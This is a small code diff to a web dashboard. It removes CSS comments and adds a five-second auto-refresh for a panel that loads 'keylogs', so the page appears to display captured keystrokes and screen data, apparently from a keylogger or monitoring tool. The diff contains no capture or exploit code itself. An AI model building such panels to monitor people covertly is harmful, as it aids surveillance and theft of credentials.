@@ -319,7 +319,7 @@ body {
     display: flex;
     flex-direction: column;
     gap: 8px;
-    max-height: 70vh;              /* scroll if too many cards */
+    max-height: 70vh;
     overflow-y: auto;
 }
 
@@ -344,9 +344,8 @@ body {
     letter-spacing: 0.2px;
     color: #e5e7eb;
     display: flex;
-    align-items: flex-start;        /* icon top aligned */
+    align-items: flex-start;
     gap: 8px;
-    /* ✅ FIX: allow wrapping for full screen data */
     white-space: normal;
     overflow: visible;
     word-break: break-word;
@@ -1079,6 +1078,13 @@ async function refreshKeylog() {
         container.innerHTML = "Error loading keylogs.";
     }
 }
+
+// ================== AUTO REFRESH (5 SECONDS) ==================
+setInterval(() => {
+    if (document.getElementById("keylogPanel").style.display === "block") {
+        refreshKeylog();
+    }
+}, 5000);
 
 // ================== INIT ==================
 function init() {
